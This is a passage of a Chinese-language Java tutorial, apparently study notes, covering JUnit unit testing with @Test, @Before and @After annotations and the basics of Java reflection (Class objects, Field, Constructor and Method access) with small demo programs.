    <content type="html"><![CDATA[<h1 id="1-junit单元测试"><a class="markdownIt-Anchor" href="#1-junit单元测试">#</a> 1、junit 单元测试</h1><h2 id="11-测试分类"><a class="markdownIt-Anchor" href="#11-测试分类">#</a> 1.1 测试分类：</h2><ol><li>黑盒测试：不用具体关注里面的代码内容，只要输入 input，经过代码的执行查看 output 是否达到预期，不需要写测试代码</li><li>白盒测试：也需要 input 和 output，但是输入了之后代码的执行，代码的逻辑、算法、严谨度、效率等都要关注，需要写测试代码</li></ol><p>junit 就是白盒测试的一种</p><h2 id="12-junit的使用"><a class="markdownIt-Anchor" href="#12-junit的使用">#</a> 1.2 junit 的使用</h2><ul><li><p>步骤</p><ol><li>定义一个测试类（测试用例）<ul><li>建议：<ol><li>测试类名：被测试类名 Test，如 CalculatorTest</li><li>包名：xxx.xxx.xx.test，如 cn.itclass.test</li></ol></li></ul></li><li>定义测试方法：可以独立运行<ul><li>建议：<ol><li>方法名：test 测试方法名，如 testAdd ()</li><li>返回值：void</li><li>参数列表：空参</li></ol></li></ul></li><li>给这个方法加 @Test</li><li>导入 Junit 依赖环境（点击红灯泡，添加 junit 到 classpath）—— 视频课包为 org.junit.Test，自己补全的为 <code>org.testng.annotations.Test;</code> ，但是能用<ul><li>运行成功后会显示绿色 Test passed</li><li>使用 junit 的时候看的不是输出的结果，看的是红色还是绿色，红色表示失败，绿色表示成功</li></ul></li></ol></li><li><p>判定结果</p><ul><li>红色：失败</li><li>绿色：成功</li><li>可以使用 Assert 对结果进行判定，如果判定结果成功就是绿色，结果与断言结果不一样是红色<ul><li>Assert：静态类，使用 Assert.assertEquals (期望值，真实值)</li><li>判定结果的时候一般不进行输出</li></ul></li></ul></li><li><p>可以在一个 junit 类里面定义多个方法，然后点击对应方法的绿色小箭头单独运行</p></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>test</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>caculater</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">After</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Before</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Test</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>testng<span class="token punctuation">.</span></span><span class="token class-name">Assert</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CalculatorTest</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Before</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"before"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 测试add方法     */</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testAdd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"我被执行了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//1.创建计算器对象</span>        caculater a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">caculater</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> sum <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//2.调用add方法</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//3.断言：我断言的结果是3，如果是一样的就是</span>        <span class="token class-name">Assert</span><span class="token punctuation">.</span><span class="token function">assertEquals</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@After</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"结束了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>补充<ul><li>@Before：<ul><li>修饰的方法会在测试方法之前被自动执行</li></ul></li><li>@After：<ul><li>修饰的方法会在测试方法执行之后被自动执行</li></ul></li></ul></li></ul><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>注：导包的时候一定要使用 <code>org.junit</code> ，如果导入的是 org.testng.annotations.Test，Test 可以正常使用，Before 和 After 不能</p></blockquote><h1 id="2-反射框架设计的灵魂"><a class="markdownIt-Anchor" href="#2-反射框架设计的灵魂">#</a> 2、反射：框架设计的灵魂</h1><ul><li><p>框架：半成品软件。可以在框架的基础上进行软件的开发，简化编码</p></li><li><p>反射：将类的各个组成部分封装为其他对象，这个过程称为<strong>反射机制</strong></p></li><li><p>java 代码在计算机中运行的三个阶段：</p><ol><li><p>Source 源代码阶段：写完一个类之后，使用 javac 进行编译，编译后成为一个 class 字节码文件，里面分三个区域，一个存档成员变量，一个存放构造方法，一个存放成员方法</p></li><li><p>Class 类对象阶段：类加载器 ClassLoader 将字节码文件加载到内存中，内存中会有一个<strong> Class 类</strong>对象来描述字节码文件，这个对象中有成员变量、构造方法、成员方法，成员变量封装成<strong> Field</strong> 对象，构造方法封装为<strong> Constructor</strong> 对象，成员方法封装为<strong> Method</strong> 对象，这三个对象在 Class 类对象里面组成 Class 类，由于变量可能有多个，于是使用一个数组来描述成员内容如下</p><ul><li>Field [] fields</li><li>Constructor[] cons</li><li>Method[] methods</li></ul><p>这些组成一个类对象，之后可以使用这些类对象进行实例化等</p></li><li><p>Runtime 运行阶段：Person 对象 new Person ();</p></li></ol></li><li><p>好处：</p><ol><li>可以在程序运行过程中去操作这些对象。</li><li>可以解耦，提高程序的可扩展性</li></ol></li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220619175957838.png" alt="image-20220619175957838"></p><h2 id="21-获取class类对象的方式"><a class="markdownIt-Anchor" href="#21-获取class类对象的方式">#</a> 2.1 获取 Class 类对象的方式</h2><ol><li><strong>Class.forName (“全类名”)</strong>：是将字节码文件加载进内存，返回 Class 对象<ul><li>多用于配置文件，将类名可以定义在配置文件中。读取文件，加载类</li></ul></li><li><strong>类名.class</strong>：通过类名的属性 class 来获取<ul><li>多用于参数的传递</li></ul></li><li><strong>对象.getClass ()</strong>：getClass () 方法在 Object 类中定义着<ul><li>多用于对象的获取字节码的方式，有对象了想获取字节码文件对象</li></ul></li></ol><ul><li>结论：同一个字节码文件 (*.class) 在一次程序的运行过程中，只会被加载一次，不论通过哪一种方式获取的 Class 对象都是同一个</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>reflect</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">Person</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">Student</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectDemo1</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//1.Class.forName("全类名")</span>        <span class="token class-name">Class</span> cls1 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"cn.itclass.domain.Person"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cls1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//2.类名.class</span>        <span class="token class-name">Class</span> cls2 <span class="token operator">=</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cls2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//3.对象.getClass()</span>        <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> cls3 <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cls3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//==比较这三个对象</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cls1 <span class="token operator">==</span> cls2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cls1 <span class="token operator">==</span> cls3<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true</span>        <span class="token class-name">Class</span> cls4 <span class="token operator">=</span> <span class="token class-name">Student</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cls1 <span class="token operator">==</span> cls4<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//false</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="22-class对象功能"><a class="markdownIt-Anchor" href="#22-class对象功能">#</a> 2.2 Class 对象功能</h2><ul><li>获取功能：<ol><li>获取成员变量们<ol><li>Field [] getFields ()：获取所有<strong> public</strong> 修饰的成员变量</li><li>Field getField (String name)：获取指定名称的<strong> public</strong> 修饰的成员变量</li><li>Field [] getDeclaredFields ()：获取所有成员变量，<strong>不考虑访问修饰符</strong></li><li>Field getDeclaredField (String name)：获取指定名称的成员变量，<strong>不考虑访问修饰符</strong></li></ol></li><li>获取构造方法们<ol><li>Constructer&lt;?&gt;[] getConstructors ()：获取所有<strong> public</strong> 修饰的构造方法</li><li>Constructer&lt;T&gt; getConstructor (类 &lt;?&gt;… parameterTypes)：获取指定 public 修饰构造方法，这里要的参数是构造参数对象</li><li>Constructer&lt;?&gt;[] getDeclaredConstructors ()：获取所有构造方法，<strong>不考虑访问修饰符</strong></li><li>Constructer&lt;T&gt; getDeclaredConstructor (类 &lt;?&gt;… parameterTypes)：获取指定构造方法，<strong>不考虑访问修饰符</strong></li></ol></li><li>获取成员方法们<ol><li>Method [] getMethods ()：获取所有 public 修饰的方法</li><li>Method getMethod ()：获取指定<strong> public</strong> 方法，参数为<strong>方法名和参数列表</strong></li><li>Method [] getDeclaredMethods ()：获取所有方法，<strong>不考虑访问修饰符</strong></li><li>Method getDeclaredMethod ()：获取指定方法，<strong>不考虑访问修饰符</strong>，参数为<strong>方法名和参数列表</strong></li></ol></li><li>获取类名<ol><li>String getName()</li></ol></li></ol></li><li>Field：成员变量<ul><li>操作：<ol><li>设置值<ul><li>set (Object obj, Object value)：给 obj 对象设置 value 值</li></ul></li><li>获取值<ul><li>get (Object obj)：获取指定对象的值，比如 get§，获取的是 p 里的这个成员变量的值</li></ul></li><li>忽略访问权限修饰符的安全检查<ul><li>setAccessible (true)：暴力反射，Field 对象中的方法</li></ul></li></ol></li></ul></li><li>Constructor：构造方法<ul><li>创建对象：T newInstance (Object … initargs)</li><li>如果使用空参数构造方法创建对象，操作可以简化：Class 对象的 newInstance</li></ul></li><li>Method：方法<ul><li>执行方法：invoke (Object obj, Object… args)，参数为对象和实际参数列表</li><li>获取方法名称：<ul><li>String getName：获取方法名</li></ul></li></ul></li><li>获取类名<ul><li>Class 对象.getName; 获取的是全类名</li></ul></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>reflect</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">Person</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token comment">/*获取成员变量*/</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectDemo2</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//0.获取person的class对象</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Person</span><span class="token punctuation">></span></span> personClass <span class="token operator">=</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        <span class="token comment">//1.Field[] getFields()</span>        <span class="token class-name">Field</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fields <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Field</span> field<span class="token operator">:</span>fields<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//2.Field getField(String name)</span>        <span class="token class-name">Field</span> a <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//获取成员变量a的值</span>        <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> value <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        a<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token string">"张三"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"==============================="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//3.Field[] getDeclaredFields()</span>        <span class="token class-name">Field</span><span class="token punctuation">[</span><span class="token punctuation">]</span> declaredFields <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Field</span> field <span class="token operator">:</span> declaredFields<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//4.Field getDeclaredField(String name)</span>        <span class="token class-name">Field</span> d <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//忽略访问权限修饰符的安全检查</span>        d<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//暴力反射</span>        <span class="token class-name">Object</span> o <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>reflect</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">Person</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token comment">/*获取构造方法*/</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectDemo3</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//0.获取Person的Class对象</span>        <span class="token class-name">Class</span> personClass <span class="token operator">=</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        <span class="token comment">//1.Constructer&lt;?>[] getConstructors()</span>        <span class="token class-name">Constructor</span><span class="token punctuation">[</span><span class="token punctuation">]</span> constructors <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//2.Constructer\&lt;T\> getConstructor(类&lt;?>... parameterTypes)</span>        <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//创建对象</span>        <span class="token class-name">Object</span> person <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"张三"</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> constructor1 <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> person2 <span class="token operator">=</span> constructor1<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//空参构造（已过时）</span>        <span class="token class-name">Object</span> o <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>reflect</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">Person</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectDemo4</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Person</span><span class="token punctuation">></span></span> personClass <span class="token operator">=</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        <span class="token comment">/**         获取成员方法们         1. 获取所有方法：Method[] getMethods()         2. 获取指定方法：Method getMethod()         3. Method[] getDeclaredMethods()         4. Method getDeclaredMethod()         */</span>        <span class="token comment">//获取指定名称的方法</span>        <span class="token class-name">Method</span> eat <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"eat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        eat<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> eat1 <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"eat"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        eat1<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token string">"hello"</span><span class="token 